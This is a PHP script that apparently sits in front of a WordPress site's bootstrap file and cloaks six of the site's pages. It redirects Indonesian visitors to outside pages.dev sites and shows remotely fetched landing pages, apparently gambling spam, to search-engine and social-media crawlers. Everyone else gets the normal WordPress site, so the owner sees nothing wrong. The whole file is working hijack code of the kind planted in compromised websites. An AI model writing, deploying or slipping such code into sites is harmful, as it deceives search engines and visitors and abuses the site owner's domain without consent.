<?php
/**
 * Cloaking Script with WordPress Bootstrap
 * Fixed: syntax error, _DIR_ typo, and broken break statement
 */

// ============================================================
// 1. FUNCTION: Fetch content from URL
// ============================================================
function mangsud($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }
    return false;
}

// ============================================================
// 2. GET User Agent, URI, and Path
// ============================================================
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$uri = $_SERVER['REQUEST_URI'] ?? '/';
$uri_path = parse_url($uri, PHP_URL_PATH);

// ============================================================
// 3. Bot Regex Pattern
// ============================================================
$bot_regex = "/(googlebot|google|adsbot|mediapartners|bingbot|slurp|yandex|duckduck|baidu|ahrefs|semrush|mj12|dotbot|crawler|spider|facebook|twitterbot|telegrambot)/i";

// ============================================================
// 4. Konfigurasi Path Cloaking
// ============================================================
$configs = [
    '/residential/' => [
        'amp' => 'https://myguyservicesllc-toto22.pages.dev/',
        'lp' => 'https://pub-f9590ba79855475a92324babdc87cffa.r2.dev/toto22/index.html'
    ],
    '/career/' => [
        'amp' => 'https://myguyservicesllc-soju88.pages.dev/',
        'lp' => 'https://pub-f9590ba79855475a92324babdc87cffa.r2.dev/soju88/index.html'
    ],
    '/about/' => [
        'amp' => 'https://myguyservicesllc-rogtoto.pages.dev/',
        'lp' => 'https://pub-f9590ba79855475a92324babdc87cffa.r2.dev/rogtoto/index.html'
    ],
    '/sitemap/' => [
        'amp' => 'https://myguyservicesllc-badak178.pages.dev/',
        'lp' => 'https://pub-f9590ba79855475a92324babdc87cffa.r2.dev/badak178/index.html'
    ],
    '/resources/' => [
        'amp' => 'https://myguyservicesllc-paris88.pages.dev/',
        'lp' => 'https://pub-f9590ba79855475a92324babdc87cffa.r2.dev/paris88/index.html'
    ],
    '/commercial/' => [
        'amp' => 'https://myguyservicesllc-tribun138.pages.dev/',
        'lp' => 'https://pub-f9590ba79855475a92324babdc87cffa.r2.dev/tribun138/index.html'
    ],
];

// ============================================================
// 5. Normalisasi Path
// ============================================================
$uri_path_normalized = rtrim($uri_path, '/');
if ($uri_path_normalized === '') {
    $uri_path_normalized = '/';
}

// ============================================================
// 6. Cek Matching Path dan Proses Cloaking
// ============================================================
$matched = false;
foreach ($configs as $path => $config) {
    $path_normalized = rtrim($path, '/');
    if ($path_normalized === '') {
        $path_normalized = '/';
    }

    if ($uri_path_normalized === $path_normalized) {
        $matched = true;

        $ip = $_SERVER['REMOTE_ADDR'] ?? '';

        // Redirect IP Indonesia ke AMP
        if (!empty($ip)) {
            $geo = @json_decode(@file_get_contents("http://ip-api.com/json/$ip"), true);
            if (!empty($geo['countryCode']) && $geo['countryCode'] === "ID") {
                header("Location: " . $config['amp']);
                exit;
            }
        }

        // Tampilkan LP untuk bot
        if (preg_match($bot_regex, $ua)) {
            $f = mangsud($config['lp']);
            if ($f) {
                echo $f;
            } else {
                echo "<script>window.location.href = '" . $config['lp'] . "';</script>";
            }
            exit;
        }

        // Non-bot, non-ID: lanjut ke WordPress
        break;
    }
}

// ============================================================
// 7. WordPress Bootstrap
// ============================================================
define('WP_USE_THEMES', true);

// FIX: Gunakan __DIR__ (bukan _DIR_ yang typo)
require __DIR__ . '/wp-blog-header.php';
?>